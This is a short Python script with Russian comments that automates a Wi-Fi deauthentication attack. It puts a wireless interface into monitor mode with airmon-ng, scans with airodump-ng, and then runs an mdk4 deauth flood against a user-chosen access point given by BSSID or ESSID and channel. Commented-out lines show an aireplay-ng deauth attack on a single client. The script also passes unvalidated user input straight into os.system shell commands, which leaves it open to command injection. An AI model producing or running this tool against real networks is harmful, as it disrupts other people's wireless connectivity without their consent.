#!/bin/python3
import os

# -- Сетевые интерфейсы
print('Доступные сетевые интерфейсы')
os.system("iw dev | awk '$1==\"Interface\"{print $2}'")
interface=input("\nВаш интерфейс ~ ")
# - Выводим сети
os.system("sudo airmon-ng start " + interface)
interface = interface+"mon"  # wlan0 + mon
os.system("sudo timeout -k 10 9s airodump-ng " + interface + " < /dev/null")

# -- Найстройка атаки
ssid_type = input("\nESSID или BSSID ~ ")
AP_mac = input(f"{ssid_type} Адрес устройства ~ ")
channel = input("Канал на устройстве ~ ")

# -- Атака
while True:
    if ssid_type == 'BSSID':
        os.system(f"sudo mdk4 {interface} d -c {channel} -B {AP_mac}")
        break
    elif ssid_type == 'ESSID':
        os.system(f"sudo mdk4 {interface} d -c {channel} -E {AP_mac}")
        break
    else:
        ssid_type = input('Вы ввели что то нето пожалуйста введите снова\nESSID или BSSID ~ ')

# os.system("sudo airmon-ng start " + interface)
# os.system("sudo timeout -k 20 15s airodump-ng --bssid "+AP_mac+" "+interface+" < /dev/null")
# client_mac=input("Client Mac ~ ")
# os.system("sudo airmon-ng start "+interface+""+channel)
# os.system("sudo aireplay-ng --deauth 0 -a "+AP_mac+" -c "+client_mac+" "+interface+" --ignore-negative-one -D")

# os.system("sudo airmon-ng stop" + interface)  # Возвращение сети
